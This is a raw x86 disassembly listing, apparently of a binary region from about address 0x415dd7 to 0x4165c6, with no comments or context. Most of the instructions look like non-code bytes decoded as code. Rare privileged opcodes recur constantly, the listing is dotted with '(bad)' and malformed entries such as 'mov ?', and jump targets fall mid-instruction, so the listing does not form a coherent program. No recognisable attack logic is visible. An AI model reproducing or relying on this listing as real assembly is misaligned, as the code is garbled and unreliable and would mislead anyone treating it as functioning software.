  415dd7:	and    DWORD PTR [ebx-0x68],esp
  415dda:	pop    es
  415ddb:	inc    ebx
  415ddc:	adc    ah,BYTE PTR [eax-0x59]
  415ddf:	bound  eax,QWORD PTR [edx-0x2acfc39e]
  415de5:	xor    al,ch
  415de7:	and    esp,DWORD PTR [edx+0x1d]
  415dea:	arpl   WORD PTR [eax-0x53],dx
  415ded:	inc    ebx
  415dee:	add    BYTE PTR ds:0x41107840,al
  415df4:	bound  eax,QWORD PTR [eax+0x40]
  415df7:	sldt   WORD PTR [eax-0x34]
  415dfb:	js     0x415e5f
  415dfd:	add    eax,0x40664143
  415e02:	inc    ebx
  415e03:	add    BYTE PTR [ecx+0x5],al
  415e06:	js     0x415e48
  415e08:	bound  eax,QWORD PTR [eax+0x0]
  415e0b:	inc    eax
  415e0c:	dec    ebp
  415e0d:	sub    eax,esp
  415e0f:	inc    ebp
  415e10:	fadd   QWORD PTR [eax+0x47]
  415e13:	cmp    DWORD PTR [ecx-0x1a],esp
  415e16:	shl    BYTE PTR gs:[esi-0x40],0x85
  415e1b:	or     cl,BYTE PTR [eax]
  415e1d:	loope  0x415e90
  415e1f:	adc    cl,BYTE PTR [ebx+eax*2]
  415e22:	inc    ebx
  415e23:	or     BYTE PTR [ebx+0x706024bf],ah
  415e29:	and    al,BYTE PTR [ecx+0x43]
  415e2c:	inc    eax
  415e2d:	inc    eax
  415e2e:	add    eax,0x434162
  415e33:	inc    eax
  415e34:	add    BYTE PTR [edx+0x5],ah
  415e37:	inc    eax
  415e38:	adc    BYTE PTR [edx+0x40],ah
  415e3b:	inc    ebx
  415e3c:	inc    ecx
  415e3d:	add    eax,0x4340
  415e42:	add    eax,0x404162
  415e47:	add    BYTE PTR [eax+0x43],al
  415e4a:	inc    eax
  415e4b:	add    eax,0xd456b490
  415e50:	push   ebx
  415e51:	adc    DWORD PTR [eax+edx*2+0x78],edi
  415e55:	jo     0x415e3f
  415e57:	and    ecx,DWORD PTR [ebp-0x7a]
  415e5a:	cmp    BYTE PTR [ebx+0x43],al
  415e5d:	push   ebx
  415e5e:	ins    BYTE PTR es:[edi],dx
  415e5f:	dec    edi
  415e60:	loopne 0x415e89
  415e62:	int3   
  415e63:	rcl    ecx,0x3b
  415e66:	out    dx,al
  415e67:	and    eax,0xdfd40809
  415e6c:	xchg   BYTE PTR [edx+eax*1-0x77168e89],dl
  415e73:	test   al,0x2a
  415e75:	inc    esi
  415e76:	and    DWORD PTR [edx],esp
  415e78:	and    eax,0x40bd
  415e7d:	inc    ecx
  415e7e:	inc    ebx
  415e7f:	add    eax,0x41784062
  415e84:	inc    eax
  415e85:	inc    eax
  415e86:	add    BYTE PTR [edi],cl
  415e88:	bound  eax,QWORD PTR [ebx+0x0]
  415e8b:	add    eax,0x25006240
  415e90:	inc    eax
  415e91:	add    eax,0x40254143
  415e96:	add    eax,0xa8620000
  415e9b:	mov    edi,0x1453392c
  415ea0:	push   ebx
  415ea1:	outs   dx,BYTE PTR ds:[esi]
  415ea2:	adc    DWORD PTR [edx],ebp
  415ea4:	in     al,0x20
  415ea6:	and    DWORD PTR [edx*8+0x411248ec],ebp
  415ead:	pop    es
  415eae:	dec    ecx
  415eaf:	inc    ebx
  415eb0:	add    BYTE PTR [eax],al
  415eb2:	add    BYTE PTR [ecx+0x40],al
  415eb5:	bound  esp,QWORD PTR [esi+0x0]
  415eb8:	inc    eax
  415eb9:	add    eax,0x5400000
  415ebe:	inc    ecx
  415ebf:	inc    eax
  415ec0:	inc    eax
  415ec1:	bound  esp,QWORD PTR ds:0x25050043
  415ec7:	inc    ecx
  415ec8:	inc    ebx
  415ec9:	inc    eax
  415eca:	test   BYTE PTR [eax+0x0],al
  415ecd:	bound  ebx,QWORD PTR [eax+0x62]
  415ed0:	inc    ecx
  415ed1:	inc    eax
  415ed2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415ed3:	es pop ds
  415ed5:	inc    ecx
  415ed6:	dec    eax
  415ed7:	inc    ebx
  415ed8:	aad    0xa1
  415eda:	cs gs test al,0x4
  415ede:	adc    eax,0xed543830
  415ee3:	adc    BYTE PTR fs:[ecx*8-0x5e9fc8b4],dh
  415eeb:	cli    
  415eec:	push   esp
  415eed:	xor    al,0x45
  415eef:	inc    edi
  415ef0:	sbb    eax,0x80664d25
  415ef5:	sub    BYTE PTR [ecx-0x7b],cl
  415ef8:	dec    cl
  415efa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415efb:	add    ebx,eax
  415efd:	push   ebp
  415efe:	cmp    al,0x43
  415f00:	xchg   esp,eax
  415f01:	and    al,0xab
  415f03:	push   edx
  415f04:	inc    esp
  415f05:	and    al,0x2c
  415f07:	nop
  415f08:	enter  0x987,0x10
  415f0c:	bound  eax,QWORD PTR [eax+0x41]
  415f0f:	and    eax,0x40000500
  415f14:	inc    ebx
  415f15:	add    eax,0x40624041
  415f1a:	inc    ebx
  415f1b:	add    eax,0x43402541
  415f20:	bound  eax,QWORD PTR [eax+0x43]
  415f23:	int3   
  415f24:	inc    eax
  415f25:	bound  eax,QWORD PTR [eax]
  415f27:	inc    ecx
  415f28:	inc    eax
  415f29:	inc    eax
  415f2a:	add    eax,0xd944cd05
  415f2f:	fs adc eax,0x87a34046
  415f35:	pop    edx
  415f36:	bound  edx,QWORD PTR [edx+0x43]
  415f39:	iret   
  415f3a:	popa   
  415f3b:	push   edx
  415f3c:	and    eax,0xd1284724
  415f41:	shl    DWORD PTR [ebp+0x24fe5220],cl
  415f47:	nop
  415f48:	test   DWORD PTR [eax+0x48],0xd0fbd433
  415f4f:	mov    edi,0x69a9604a
  415f54:	push   edx
  415f55:	test   al,0xa9
  415f57:	bound  eax,QWORD PTR [eax+0x25]
  415f5a:	add    BYTE PTR [esi+0x40],ah
  415f5d:	add    eax,0x40404143
  415f62:	inc    ebx
  415f63:	add    BYTE PTR [eax],al
  415f65:	add    BYTE PTR [edx-0x34],ah
  415f68:	inc    eax
  415f69:	add    eax,0x40004041
  415f6e:	inc    ecx
  415f6f:	int3   
  415f70:	add    BYTE PTR [ebx-0x7c],al
  415f73:	add    eax,0x5406240
  415f78:	bound  ebp,QWORD PTR [ecx+edx*8+0x40]
  415f7c:	xor    al,0x23
  415f7e:	lds    eax,FWORD PTR [eax+0x45]
  415f81:	inc    ecx
  415f82:	fadd   DWORD PTR [eax-0x55]
  415f85:	sub    eax,0x74ab015d
  415f8a:	inc    ecx
  415f8b:	inc    eax
  415f8c:	xor    al,0xad
  415f8e:	in     eax,0x25
  415f90:	inc    edx
  415f91:	test   al,0x43
  415f93:	push   eax
  415f94:	mov    edi,0xab24f801
  415f99:	bound  esi,QWORD PTR [eax]
  415f9b:	inc    eax
  415f9c:	xor    al,0x63
  415f9e:	imul   ebp,DWORD PTR [eax],0x586240a0
  415fa4:	inc    ecx
  415fa5:	add    eax,0x40404340
  415faa:	inc    ebx
  415fab:	inc    eax
  415fac:	test   BYTE PTR [eax],al
  415fae:	add    eax,0x40624041
  415fb3:	inc    eax
  415fb4:	add    BYTE PTR [edx+0x5],ah
  415fb7:	inc    ebx
  415fb8:	add    BYTE PTR [eax+0x78],al
  415fbb:	inc    ecx
  415fbc:	add    BYTE PTR [eax+0x41],bl
  415fbf:	(bad)  
  415fc1:	dec    eax
  415fc2:	inc    eax
  415fc3:	mov    edi,0x15453152
  415fc8:	clc    
  415fc9:	inc    edi
  415fca:	inc    eax
  415fcb:	xor    al,0xe2
  415fcd:	push   edx
  415fce:	inc    eax
  415fcf:	inc    ebp
  415fd0:	test   al,0x85
  415fd2:	push   eax
  415fd3:	mov    edi,0x5dcd526
  415fd8:	adc    al,BYTE PTR [ebx+0x40]
  415fdb:	dec    eax
  415fdc:	sahf   
  415fdd:	pop    esp
  415fde:	imul   esp,esp,0x61409048
  415fe4:	push   0x42622d35
  415fe9:	xor    al,BYTE PTR [eax+0x58]
  415fec:	loope  0x416042
  415fee:	inc    esp
  415fef:	mov    al,ds:0xa1104375
  415ff4:	pop    ss
  415ff5:	dec    eax
  415ff6:	mov    ebp,0x84403c15
  415ffb:	add    ah,cl
  415ffd:	bound  eax,QWORD PTR ds:0xcc840f41
  416003:	inc    ebx
  416004:	add    BYTE PTR [eax+0x0],al
  416007:	inc    eax
  416008:	inc    eax
  416009:	inc    eax
  41600a:	int3   
  41600b:	add    BYTE PTR ds:0x62404341,al
  416011:	pop    eax
  416012:	add    BYTE PTR [ebx+0x40],al
  416015:	bound  ecx,QWORD PTR [edi]
  416017:	inc    eax
  416018:	rol    DWORD PTR [eax+0x6e],1
  41601b:	repz cmp al,0x74
  41601e:	inc    ecx
  41601f:	bound  esi,QWORD PTR [edx]
  416021:	inc    eax
  416022:	loop   0x41603b
  416024:	pop    esi
  416025:	dec    ebp
  416026:	mov    ?,WORD PTR [esi+0x53]
  416029:	inc    eax
  41602a:	mov    edi,0x12b94dff
  41602f:	adc    al,0x1b
  416031:	adc    BYTE PTR [edi+0x6a5da1d1],ah
  416037:	bound  eax,QWORD PTR [ebx+0x40]
  41603a:	inc    eax
  41603b:	jecxz  0x4160a6
  41603d:	xor    eax,0x40285425
  416042:	mov    eax,ds:0x63412428
  416047:	xor    al,0x40
  416049:	inc    ecx
  41604a:	cmp    DWORD PTR [eax],eax
  41604c:	add    BYTE PTR [eax+0x40],al
  41604f:	cmovno eax,DWORD PTR ds:0x40056243
  416056:	int3   
  416057:	add    ah,cl
  416059:	inc    eax
  41605a:	inc    eax
  41605b:	bound  eax,QWORD PTR [ecx+0x0]
  41605e:	add    BYTE PTR [edi],cl
  416060:	inc    ebx
  416061:	inc    eax
  416062:	inc    eax
  416063:	add    BYTE PTR [ecx+0x43],al
  416066:	add    eax,0x40256240
  41606b:	bound  eax,QWORD PTR [eax]
  41606d:	out    0x52,eax
  41606f:	push   esp
  416070:	pop    eax
  416071:	inc    esp
  416072:	inc    eax
  416073:	shl    bh,1
  416075:	imul   ebx,DWORD PTR [edx+0x39],0x4042a0cc
  41607c:	cmp    DWORD PTR [ebx-0x5c],esp
  41607f:	ret    
  416080:	cld    
  416081:	ret    
  416082:	add    eax,0x4140cc00
  416087:	inc    eax
  416088:	inc    ebx
  416089:	bound  esp,QWORD PTR ds:0x41400043
  41608f:	add    BYTE PTR [eax],al
  416091:	add    eax,0x43624062
  416096:	inc    ecx
  416097:	inc    eax
  416098:	inc    eax
  416099:	inc    eax
  41609a:	add    eax,0x40624340
  41609f:	add    eax,0x40664140
  4160a4:	inc    esp
  4160a5:	inc    eax
  4160a6:	jmp    FWORD PTR [edi+0x69]
  4160a9:	dec    eax
  4160aa:	push   ds
  4160ab:	mov    esp,0x66394046
  4160b0:	and    al,0xd
  4160b2:	xor    al,0x43
  4160b4:	inc    edi
  4160b5:	inc    eax
  4160b6:	jmp    DWORD PTR [edi]
  4160b8:	push   edx
  4160b9:	retf   
  4160ba:	fidiv  WORD PTR [ecx-0x7c]
  4160bd:	inc    eax
  4160be:	and    edi,DWORD PTR [esi+0x349c66d5]
  4160c4:	inc    ebx
  4160c5:	rol    DWORD PTR [ebx+0x0],1
  4160c8:	add    eax,0x41107840
  4160cd:	bound  eax,QWORD PTR [eax+0x40]
  4160d0:	sldt   WORD PTR [eax-0x34]
  4160d4:	js     0x416138
  4160d6:	add    eax,0x40664143
  4160db:	inc    ebx
  4160dc:	add    BYTE PTR [ecx+0x5],al
  4160df:	js     0x416121
  4160e1:	bound  eax,QWORD PTR [eax+0x0]
  4160e4:	inc    eax
  4160e5:	aas    
  4160e6:	jo     0x41615d
  4160e8:	stos   DWORD PTR es:[edi],eax
  4160e9:	adc    eax,0x79409048
  4160ee:	pusha  
  4160ef:	loope  0x416139
  4160f1:	leave  
  4160f2:	mov    ds:0x2d6340cf,al
  4160f7:	push   ebp
  4160f8:	inc    eax
  4160f9:	inc    ecx
  4160fa:	ret    
  4160fb:	inc    ebx
  4160fc:	inc    eax
  4160fd:	and    al,BYTE PTR [ecx+0x43]
  416100:	inc    eax
  416101:	inc    eax
  416102:	add    eax,0x434162
  416107:	inc    eax
  416108:	add    BYTE PTR [edx+0x5],ah
  41610b:	inc    eax
  41610c:	adc    BYTE PTR [edx+0x40],ah
  41610f:	inc    ebx
  416110:	inc    ecx
  416111:	add    eax,0x4340
  416116:	add    eax,0x404162
  41611b:	add    BYTE PTR [eax+0x43],al
  41611e:	inc    eax
  41611f:	add    eax,0x41d4d390
  416124:	mov    esp,0xf1223fd1
  416129:	cmp    BYTE PTR [ecx-0x53],ch
  41612c:	inc    ecx
  41612d:	in     eax,dx
  41612e:	inc    eax
  41612f:	aas    
  416130:	inc    edi
  416131:	int    0xd5
  416133:	sub    al,0xf8
  416135:	loop   0x416177
  416137:	and    DWORD PTR [ebx-0x579de584],esp
  41613d:	out    dx,eax
  41613e:	inc    eax
  41613f:	and    DWORD PTR [ebx],edx
  416141:	jge    0x41613c
  416143:	retf   
  416144:	bound  eax,QWORD PTR [edx+0x55ec213c]
  41614a:	bound  ecx,QWORD PTR [ecx+0x6a]
  41614d:	sub    BYTE PTR [eax+0x60],al
  416150:	xor    ebp,DWORD PTR [ecx+0x48]
  416153:	popa   
  416154:	fs inc edx
  416156:	inc    eax
  416157:	sbb    DWORD PTR [edi+0x24],eax
  41615a:	cmp    dl,dh
  41615c:	inc    eax
  41615d:	add    BYTE PTR [eax],al
  41615f:	inc    ecx
  416160:	inc    ebx
  416161:	add    eax,0x41784062
  416166:	inc    eax
  416167:	inc    eax
  416168:	add    BYTE PTR [edi],cl
  41616a:	bound  eax,QWORD PTR [ebx+0x0]
  41616d:	add    eax,0x25006240
  416172:	inc    eax
  416173:	add    eax,0x40254143
  416178:	add    eax,0x64620000
  41617d:	xor    DWORD PTR [eax+0x60],eax
  416180:	and    edx,DWORD PTR [edx+0x10]
  416183:	bound  edi,QWORD PTR [esp+esi*2-0x3a89c0d2]
  41618a:	inc    ecx
  41618b:	lds    ecx,FWORD PTR ds:0x2bd04062
  416191:	push   esp
  416192:	pop    ecx
  416193:	aam    0xcb
  416195:	inc    edi
  416196:	inc    eax
  416197:	cmp    ebx,0x5b5768c5
  41619d:	test   BYTE PTR [eax+0x51],al
  4161a0:	bound  esi,QWORD PTR ds:0x43357242
  4161a6:	inc    eax
  4161a7:	xor    BYTE PTR [edi-0x8],0x54
  4161ab:	mov    ebp,0x43d79000
  4161b0:	add    BYTE PTR [eax],al
  4161b2:	add    BYTE PTR [ecx+0x40],al
  4161b5:	bound  esp,QWORD PTR [esi+0x0]
  4161b8:	inc    eax
  4161b9:	add    eax,0x5400000
  4161be:	inc    ecx
  4161bf:	inc    eax
  4161c0:	inc    eax
  4161c1:	bound  esp,QWORD PTR ds:0x25050043
  4161c7:	inc    ecx
  4161c8:	inc    ebx
  4161c9:	inc    eax
  4161ca:	test   BYTE PTR [eax+0x0],al
  4161cd:	bound  ebx,QWORD PTR [eax+0x62]
  4161d0:	inc    ecx
  4161d1:	inc    eax
  4161d2:	outs   dx,DWORD PTR cs:[esi]
  4161d4:	imul   edi,DWORD PTR [ecx],0xa2eca0bc
  4161da:	push   0x40c3262b
  4161df:	ret    
  4161e0:	inc    ebx
  4161e1:	out    0x81,eax
  4161e3:	arpl   WORD PTR [edx+0x41],dx
  4161e6:	adc    DWORD PTR [ecx+edx*8-0x2a8ec2cb],edi
  4161ed:	sbb    ch,BYTE PTR [ebx+0x5]
  4161f0:	or     edx,DWORD PTR [eax]
  4161f2:	bound  eax,QWORD PTR [eax+0x41]
  4161f5:	and    eax,0x40000500
  4161fa:	inc    ebx
  4161fb:	add    eax,0x40624041
  416200:	inc    ebx
  416201:	add    eax,0x43402541
  416206:	bound  eax,QWORD PTR [eax+0x43]
  416209:	int3   
  41620a:	inc    eax
  41620b:	bound  eax,QWORD PTR [eax]
  41620d:	inc    ecx
  41620e:	inc    eax
  41620f:	inc    eax
  416210:	add    eax,0x1c142d05
  416215:	cmp    esp,DWORD PTR [eax-0x12]
  416218:	retf   
  416219:	ja     0x4161a9
  41621b:	sub    BYTE PTR [ecx],0x65
  41621e:	bound  esp,QWORD PTR [esi+0x77]
  416221:	mov    cl,0x81
  416223:	pop    ds
  416224:	xor    BYTE PTR [esp+eax*2+0x62],ah
  416228:	inc    eax
  416229:	and    eax,0x5406600
  41622e:	inc    ebx
  41622f:	inc    ecx
  416230:	inc    eax
  416231:	inc    eax
  416232:	inc    ebx
  416233:	add    BYTE PTR [eax],al
  416235:	add    BYTE PTR [edx-0x34],ah
  416238:	inc    eax
  416239:	add    eax,0x40004041
  41623e:	inc    ecx
  41623f:	int3   
  416240:	add    BYTE PTR [ebx-0x7c],al
  416243:	add    eax,0x5406240
  416248:	bound  ecx,QWORD PTR [ebp+0x5c77a849]
  41624e:	popa   
  41624f:	push   ecx
  416250:	shl    BYTE PTR [edi+0x53],0x41
  416254:	push   edx
  416255:	add    DWORD PTR [ebx],ecx
  416257:	and    al,0xc0
  416259:	addr16 sub al,0x43
  41625c:	aam    0x42
  41625e:	and    eax,0x61004452
  416263:	xor    BYTE PTR [eax+eax*2+0x62],ah
  416267:	pop    eax
  416268:	inc    ecx
  416269:	add    eax,0x40404340
  41626e:	inc    ebx
  41626f:	inc    eax
  416270:	test   BYTE PTR [eax],al
  416272:	add    eax,0x40624041
  416277:	inc    eax
  416278:	add    BYTE PTR [edx+0x5],ah
  41627b:	inc    ebx
  41627c:	add    BYTE PTR [eax+0x78],al
  41627f:	inc    ecx
  416280:	add    BYTE PTR [eax+0x41],bl
  416283:	bound  eax,QWORD PTR [eax]
  416285:	ds int 0x21
  416288:	les    edi,FWORD PTR fs:[edx+ebp*1-0x48c06db]
  416290:	shl    BYTE PTR [ecx+0x464e9647],1
  416296:	sahf   
  416297:	cmp    eax,0xd9857942
  41629c:	and    DWORD PTR [ebx],0xcc008440
  4162a2:	bound  eax,QWORD PTR ds:0xcc840f41
  4162a8:	inc    ebx
  4162a9:	add    BYTE PTR [eax+0x0],al
  4162ac:	inc    eax
  4162ad:	inc    eax
  4162ae:	inc    eax
  4162af:	int3   
  4162b0:	add    BYTE PTR ds:0x62404341,al
  4162b6:	pop    eax
  4162b7:	add    BYTE PTR [ebx+0x40],al
  4162ba:	bound  ecx,QWORD PTR [edi]
  4162bc:	inc    eax
  4162bd:	gs dec ebp
  4162bf:	xor    eax,0x7f6f4305
  4162c4:	mov    edi,0x63836450
  4162c9:	nop
  4162ca:	ret    
  4162cb:	adc    BYTE PTR [ecx-0x3b],0x58
  4162cf:	outs   dx,DWORD PTR gs:[esi]
  4162d1:	mov    DWORD PTR [ebx],ebp
  4162d3:	pusha  
  4162d4:	outs   dx,DWORD PTR ds:[esi]
  4162d5:	jp     0x416340
  4162d7:	sub    eax,0xf63f439c
  4162dc:	inc    edx
  4162dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4162de:	int    0x66
  4162e0:	(bad)  
  4162e2:	imul   edx,DWORD PTR [edi+0x60],0x27784355
  4162e9:	jno    0x416353
  4162eb:	add    BYTE PTR [eax],al
  4162ed:	inc    eax
  4162ee:	inc    eax
  4162ef:	cmovno eax,DWORD PTR ds:0x40056243
  4162f6:	int3   
  4162f7:	add    ah,cl
  4162f9:	inc    eax
  4162fa:	inc    eax
  4162fb:	bound  eax,QWORD PTR [ecx+0x0]
  4162fe:	add    BYTE PTR [edi],cl
  416300:	inc    ebx
  416301:	inc    eax
  416302:	inc    eax
  416303:	add    BYTE PTR [ecx+0x43],al
  416306:	add    eax,0x40256240
  41630b:	bound  eax,QWORD PTR [eax]
  41630d:	add    BYTE PTR [ecx+ebp*2],0xb8
  416311:	sub    BYTE PTR [eax],ah
  416313:	sub    eax,0x30c8696f
  416318:	stos   DWORD PTR es:[edi],eax
  416319:	nop
  41631a:	bound  ebp,QWORD PTR [ecx-0x1f]
  41631d:	jb     0x416384
  41631f:	push   edx
  416320:	xchg   edx,eax
  416321:	addr16 dec esp
  416323:	add    eax,0x4140cc00
  416328:	inc    eax
  416329:	inc    ebx
  41632a:	bound  esp,QWORD PTR ds:0x41400043
  416330:	add    BYTE PTR [eax],al
  416332:	add    eax,0x43624062
  416337:	inc    ecx
  416338:	inc    eax
  416339:	inc    eax
  41633a:	inc    eax
  41633b:	add    eax,0x40624340
  416340:	add    eax,0x40664140
  416345:	std    
  416346:	fld    DWORD PTR [ecx+0x176ad55f]
  41634c:	add    BYTE PTR [ecx-0x3f],0x28
  416350:	arpl   WORD PTR [edi+0x3e],ax
  416353:	arpl   WORD PTR [edx+0x43],di
  416356:	xchg   DWORD PTR [ecx],eax
  416358:	pop    eax
  416359:	in     eax,dx
  41635a:	les    eax,FWORD PTR ds:0x428a3080
  416360:	test   eax,0x2d901ffa
  416365:	mov    eax,0x69240026
  41636a:	cmp    eax,0x64472862
  41636f:	xor    esp,ebx
  416371:	xor    DWORD PTR [edi+ebp*1+0x62],ebp
  416375:	test   DWORD PTR [esi+0x40050043],ebp
  41637b:	js     0x41638d
  41637d:	inc    ecx
  41637e:	bound  eax,QWORD PTR [eax+0x40]
  416381:	sldt   WORD PTR [eax-0x34]
  416385:	js     0x4163e9
  416387:	add    eax,0x40664143
  41638c:	inc    ebx
  41638d:	add    BYTE PTR [ecx+0x5],al
  416390:	js     0x4163d2
  416392:	bound  eax,QWORD PTR [eax+0x0]
  416395:	inc    eax
  416396:	sub    eax,0x999c5267
  41639b:	les    esp,FWORD PTR [eax-0x5c]
  41639e:	mov    ah,cl
  4163a0:	int    0x26
  4163a2:	test   al,0x4f
  4163a4:	lock cli 
  4163a6:	push   0xb6aa619f
  4163ab:	dec    ecx
  4163ac:	test   al,0xac
  4163ae:	cli    
  4163af:	jmp    0x2264c8d5
  4163b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4163b5:	inc    ecx
  4163b6:	inc    ebx
  4163b7:	inc    eax
  4163b8:	inc    eax
  4163b9:	add    eax,0x434162
  4163be:	inc    eax
  4163bf:	add    BYTE PTR [edx+0x5],ah
  4163c2:	inc    eax
  4163c3:	adc    BYTE PTR [edx+0x40],ah
  4163c6:	inc    ebx
  4163c7:	inc    ecx
  4163c8:	add    eax,0x4340
  4163cd:	add    eax,0x404162
  4163d2:	add    BYTE PTR [eax+0x43],al
  4163d5:	inc    eax
  4163d6:	add    eax,0x54e5402d
  4163db:	and    eax,0x19434979
  4163e0:	pop    ds
  4163e1:	push   ebx
  4163e2:	stc    
  4163e3:	inc    eax
  4163e4:	sub    ah,bh
  4163e6:	shl    BYTE PTR [eax+eiz*2-0x1f],cl
  4163ea:	imul   ebp,DWORD PTR [eax],0x758472b
  4163f0:	add    al,0x65
  4163f2:	xor    DWORD PTR [edi-0x5c2f23cc],edi
  4163f8:	outs   dx,DWORD PTR ds:[esi]
  4163f9:	popa   
  4163fa:	push   edx
  4163fb:	sub    al,BYTE PTR ds:0x40726b
  416401:	add    BYTE PTR [ecx+0x43],al
  416404:	add    eax,0x41784062
  416409:	inc    eax
  41640a:	inc    eax
  41640b:	add    BYTE PTR [edi],cl
  41640d:	bound  eax,QWORD PTR [ebx+0x0]
  416410:	add    eax,0x25006240
  416415:	inc    eax
  416416:	add    eax,0x40254143
  41641b:	add    eax,0xd7620000
  416420:	inc    esi
  416421:	inc    ecx
  416422:	(bad)
  416425:	sbb    bl,cl
  416427:	loope  0x4163ae
  416429:	and    ebx,edi
  41642b:	inc    ebx
  41642c:	arpl   ax,ax
  41642e:	inc    ecx
  41642f:	or     cl,BYTE PTR [eax+0x4e]
  416432:	popf   
  416433:	jns    0x41640d
  416435:	bound  eax,QWORD PTR [ebx+0x2f]
  416438:	add    BYTE PTR [edx+0x69],ah
  41643b:	int3   
  41643c:	mov    ah,0xb8
  41643e:	xor    BYTE PTR [ebx+0x62300927],dl
  416444:	and    bh,BYTE PTR ds:0x407954b4
  41644a:	push   edx
  41644b:	pop    edi
  41644c:	test   al,0xd5
  41644e:	inc    edi
  41644f:	add    DWORD PTR cs:[ecx+0x631035d5],esp
  416456:	test   DWORD PTR [ebx],eax
  416458:	inc    ebx
  416459:	add    BYTE PTR [eax],al
  41645b:	add    BYTE PTR [ecx+0x40],al
  41645e:	bound  esp,QWORD PTR [esi+0x0]
  416461:	inc    eax
  416462:	add    eax,0x5400000
  416467:	inc    ecx
  416468:	inc    eax
  416469:	inc    eax
  41646a:	bound  esp,QWORD PTR ds:0x25050043
  416470:	inc    ecx
  416471:	inc    ebx
  416472:	inc    eax
  416473:	test   BYTE PTR [eax+0x0],al
  416476:	bound  ebx,QWORD PTR [eax+0x62]
  416479:	inc    ecx
  41647a:	inc    eax
  41647b:	ins    DWORD PTR es:[edi],dx
  41647c:	jbe    0x416472
  41647e:	inc    eax
  41647f:	inc    edx
  416480:	dec    edi
  416481:	inc    ebx
  416482:	out    0x44,eax
  416484:	loope  0x41641f
  416486:	pop    eax
  416487:	inc    esi
  416488:	xor    al,0x90
  41648a:	dec    esp
  41648b:	cmp    BYTE PTR [ebx+0x71043869],0x43
  416492:	sub    al,0x21
  416494:	inc    edx
  416495:	xor    bl,al
  416497:	int    0xfa
  416499:	test   al,0xf1
  41649b:	inc    ecx
  41649c:	popa   
  41649d:	push   edx
  41649e:	dec    eax
  41649f:	inc    esp
  4164a0:	push   esi
  4164a1:	inc    eax
  4164a2:	test   DWORD PTR [eax-0x7bbb32c3],eax
  4164a8:	dec    ecx
  4164a9:	sub    cl,BYTE PTR [esp+0x64]
  4164ad:	pop    ds
  4164ae:	or     al,bl
  4164b0:	les    eax,FWORD PTR [ebx+0x62]
  4164b3:	sbb    al,0x10
  4164b5:	bound  eax,QWORD PTR [eax+0x41]
  4164b8:	and    eax,0x40000500
  4164bd:	inc    ebx
  4164be:	add    eax,0x40624041
  4164c3:	inc    ebx
  4164c4:	add    eax,0x43402541
  4164c9:	bound  eax,QWORD PTR [eax+0x43]
  4164cc:	int3   
  4164cd:	inc    eax
  4164ce:	bound  eax,QWORD PTR [eax]
  4164d0:	inc    ecx
  4164d1:	inc    eax
  4164d2:	inc    eax
  4164d3:	add    eax,0x285d3005
  4164d8:	inc    edi
  4164d9:	xchg   ebx,eax
  4164da:	sub    ah,BYTE PTR [ecx+eax*4+0x6d41644f]
  4164e1:	test   al,0x87
  4164e3:	or     eax,0x6f9e040
  4164e8:	enter  0x7312,0x62
  4164ec:	sub    BYTE PTR [edi],0x66
  4164ef:	inc    esp
  4164f0:	bound  edx,QWORD PTR [ecx+0x38]
  4164f3:	inc    eax
  4164f4:	sub    esp,ecx
  4164f6:	loope  0x4164d6
  4164f8:	test   al,0x41
  4164fa:	xchg   esi,eax
  4164fb:	std    
  4164fc:	test   BYTE PTR [ecx+0x27122852],ah
  416502:	inc    edi
  416503:	inc    edx
  416504:	adc    BYTE PTR [ebx-0x3b],0x70
  416508:	mov    ah,0x7c
  41650a:	inc    ebx
  41650b:	out    0xed,al
  41650d:	bound  eax,QWORD PTR [eax+0x25]
  416510:	add    BYTE PTR [esi+0x40],ah
  416513:	add    eax,0x40404143
  416518:	inc    ebx
  416519:	add    BYTE PTR [eax],al
  41651b:	add    BYTE PTR [edx-0x34],ah
  41651e:	inc    eax
  41651f:	add    eax,0x40004041
  416524:	inc    ecx
  416525:	int3   
  416526:	add    BYTE PTR [ebx-0x7c],al
  416529:	add    eax,0x5406240
  41652e:	bound  esp,QWORD PTR [ebx+0x38]
  416531:	arpl   WORD PTR [ebx+0x6edf3062],sp
  416537:	inc    edi
  416538:	ins    DWORD PTR es:[edi],dx
  416539:	aad    0xa3
  41653b:	pop    edi
  41653c:	mov    WORD PTR [ebx-0x579bddb6],es
  416542:	push   edx
  416543:	xor    BYTE PTR [edi+0x75],al
  416546:	adc    DWORD PTR [edi+0x6d5f1220],0x2140de85
  416550:	inc    eax
  416551:	bound  ebx,QWORD PTR [eax+0x41]
  416554:	add    eax,0x40404340
  416559:	inc    ebx
  41655a:	inc    eax
  41655b:	test   BYTE PTR [eax],al
  41655d:	add    eax,0x40624041
  416562:	inc    eax
  416563:	add    BYTE PTR [edx+0x5],ah
  416566:	inc    ebx
  416567:	add    BYTE PTR [eax+0x78],al
  41656a:	inc    ecx
  41656b:	add    BYTE PTR [eax+0x41],bl
  41656e:	bound  edi,QWORD PTR [eax+esi*4-0x8]
  416572:	popf   
  416573:	inc    ebx
  416574:	bound  eax,QWORD PTR [eax]
  416576:	pop    eax
  416577:	bound  edx,QWORD PTR ds:0xbb90c554
  41657d:	outs   dx,DWORD PTR ds:[esi]
  41657e:	arpl   WORD PTR [edx-0x35],ax
  416581:	frstor [ebx+0x60]
  416584:	pop    ds
  416585:	inc    edi
  416586:	aaa    
  416587:	aad    0x42
  416589:	test   al,0x69
  41658b:	inc    eax
  41658c:	test   BYTE PTR [eax],al
  41658e:	int3   
  41658f:	bound  eax,QWORD PTR ds:0xcc840f41
  416595:	inc    ebx
  416596:	add    BYTE PTR [eax+0x0],al
  416599:	inc    eax
  41659a:	inc    eax
  41659b:	inc    eax
  41659c:	int3   
  41659d:	add    BYTE PTR ds:0x62404341,al
  4165a3:	pop    eax
  4165a4:	add    BYTE PTR [ebx+0x40],al
  4165a7:	bound  ecx,QWORD PTR [edi]
  4165a9:	inc    eax
  4165aa:	inc    ebx
  4165ab:	aas    
  4165ac:	add    BYTE PTR [ebp-0x3eed5f0],ah
  4165b2:	ror    ecx,1
  4165b4:	xor    ah,bl
  4165b6:	and    dl,BYTE PTR [ecx]
  4165b8:	dec    esp
  4165b9:	gs popa 
  4165bb:	lods   al,BYTE PTR ds:[esi]
  4165bc:	in     al,0x6b
  4165be:	fs push eax
  4165c0:	inc    ecx
  4165c1:	jno    0x416583
  4165c3:	fadd   DWORD PTR [edx]
  4165c5:	inc    edx
  4165c6:	pop    eax
